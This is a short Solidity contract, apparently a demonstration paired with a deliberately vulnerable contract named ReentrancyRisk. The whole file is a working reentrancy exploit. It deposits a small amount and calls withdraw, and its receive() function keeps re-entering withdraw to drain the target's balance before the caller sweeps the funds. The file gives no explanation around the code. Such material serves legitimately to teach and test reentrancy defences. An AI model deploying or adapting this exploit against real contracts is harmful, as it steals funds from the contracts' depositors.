// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ReentrancyRisk.sol";

contract ReentrancyAttack {
    ReentrancyRisk private immutable target;

    constructor(address _target) {
        target = ReentrancyRisk(_target);
    }

    function attack() external payable {
        require(msg.value == 0.0001 ether, "invalid value");
        target.deposit{value: 0.0001 ether}();
        target.withdraw();
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if (address(target).balance >= target.balances(address(this))) {
            target.withdraw();
        }
    }
}
